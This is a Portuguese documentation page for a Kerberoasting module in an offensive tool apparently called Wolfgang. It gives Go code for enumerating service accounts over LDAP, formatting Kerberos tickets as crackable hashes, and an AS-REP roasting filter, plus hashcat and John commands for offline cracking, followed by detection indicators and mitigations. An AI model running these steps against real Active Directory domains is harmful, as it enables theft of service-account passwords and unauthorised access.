    Kerberoasting¶

    O que é¶

    Kerberoasting explora o protocolo Kerberos para extrair hashes de senhas de service accounts. Qualquer usuário autenticado no domínio pode solicitar um TGS (Ticket Granting Service) ticket para qualquer serviço registrado com um SPN (Service Principal Name). O ticket é cifrado com a senha da service account -- se essa senha for fraca, pode ser cracked offline.

    A técnica não requer nenhum privilégio elevado: basta uma conta de domínio válida. Não toca no LSASS, não modifica o registro, e o tráfego é indistinguível de autenticação Kerberos legítima.

    Por que funciona¶

    O fluxo Kerberos padrão é:

    1. O cliente autentica com o KDC e recebe um TGT (Ticket Granting Ticket)
    2. Para acessar um serviço, o cliente apresenta o TGT ao KDC e pede um TGS ticket
    3. O KDC emite o TGS cifrado com a chave derivada da senha da service account
    4. O cliente apresenta o TGS ao serviço para autenticação

    O ponto-chave: o KDC emite o TGS sem verificar se o cliente realmente vai acessar o serviço. Qualquer usuário do domínio pode solicitar um TGS para qualquer SPN, e o KDC vai cifrá-lo com a senha da service account correspondente.

    Service accounts frequentemente têm senhas fracas ou que nunca foram rotacionadas porque:

    • São configuradas uma vez e esquecidas
    • Administradores evitam alterar senhas de serviço por medo de quebrar integrações
    • Não estão sujeitas às mesmas políticas de complexidade de contas de usuário

    O ticket é cifrado com RC4-HMAC (NTLM hash) por padrão, que é computacionalmente barato para brute force. Mesmo tickets AES256 podem ser cracked com hardware suficiente.

    Implementação no Wolfgang¶

    O módulo kerberoast (pkg/module/credential/kerberos.go) opera em duas fases: enumeração de SPNs via LDAP e solicitação de tickets via SSPI.

    Fase 1: Enumeração de SPNs¶

    Busca contas de usuário (não computadores) com SPNs registrados via LDAP:

    func buildSPNFilter() string {
    return "(&(servicePrincipalName=*)(!(objectClass=computer)))"
}

func enumerateSPNs(ldapURL, baseDN, bindUser, bindPass string) ([]SPNEntry, error) {
    conn, _ := ldap.DialURL(ldapURL)
    conn.Bind(bindUser, bindPass)

    req := ldap.NewSearchRequest(
        baseDN,
        ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
        buildSPNFilter(),
        []string{"sAMAccountName", "servicePrincipalName", "dn"},
        nil,
    )
    result, _ := conn.Search(req)
    // ...
}

    O filtro (!(objectClass=computer)) exclui machine accounts, que têm senhas de 120+ caracteres randomizados e não são viáveis para cracking.

    Fase 2: Solicitação de tickets¶

    Para cada SPN encontrado, o módulo solicita um TGS ticket via SSPI (Windows) e formata o hash para cracking offline:

    func formatKerberoastHash(user, realm, spn string, etype int32, ticketData []byte) string {
    checksum := hex.EncodeToString(ticketData[:16])
    encrypted := hex.EncodeToString(ticketData[16:])
    return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
        etype, user, realm, spn, checksum, encrypted)
}

    O formato de saída $krb5tgs$... é compatível com Hashcat (mode 13100 para RC4, 19700 para AES256) e John the Ripper.

    Extração do realm¶

    O realm Kerberos é derivado automaticamente dos componentes DC do Distinguished Name:

    func extractRealmFromDN(dn string) string {
    // "DC=corp,DC=local" -> "CORP.LOCAL"
    var parts []string
    for _, component := range strings.Split(dn, ",") {
        if strings.HasPrefix(strings.ToUpper(component), "DC=") {
            parts = append(parts, strings.ToUpper(component[3:]))
        }
    }
    return strings.Join(parts, ".")
}

    Ações do módulo¶

    O módulo suporta duas ações:

    • enumerate: Lista SPNs disponíveis sem solicitar tickets (reconhecimento)
    • roast: Enumera SPNs e solicita tickets para cracking (ação principal)

    Cracking Offline¶

    RC4-HMAC (etype 23) -- Mais comum¶

    # Hashcat
hashcat -m 13100 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# John the Ripper
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt

    Velocidade aproximada: ~500 MH/s em GPU moderna (RTX 4090).

    AES256 (etype 18) -- Mais seguro¶

    hashcat -m 19700 -a 0 hashes.txt wordlist.txt

    Velocidade aproximada: ~200 KH/s na mesma GPU -- significativamente mais lento.

    AS-REP Roasting¶

    O Wolfgang também suporta detecção de contas com pre-authentication desabilitada (AS-REP roasting) via filtro LDAP:

    func buildASREPFilter() string {
    return "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(objectClass=computer)))"
}

    O bit 4194304 (DONT_REQUIRE_PREAUTH) permite solicitar um TGT sem autenticação prévia, expondo a senha da conta diretamente.

    Detecção¶

    IOC Descrição
    Múltiplos TGS-REQ para SPNs distintos em curto intervalo Padrão de enumeração automatizada
    TGS-REQ com encryption type RC4 (etype 23) Downgrade de encryption para facilitar cracking
    Event ID 4769 (Kerberos Service Ticket Operations) Auditar volume anormal de tickets
    LDAP queries com filtro servicePrincipalName=* Enumeração de SPNs

    Mitigações:

    • AES encryption: Forçar etype 17/18 via GPO reduz drasticamente a velocidade de cracking
    • gMSA (Group Managed Service Accounts): Senhas de 240+ caracteres, rotação automática de 30 dias
    • Senhas longas para service accounts: Mínimo 25+ caracteres randomizados
    • Monitorar RC4 ticket requests: Alertar quando tickets RC4 são solicitados em ambiente AES-only
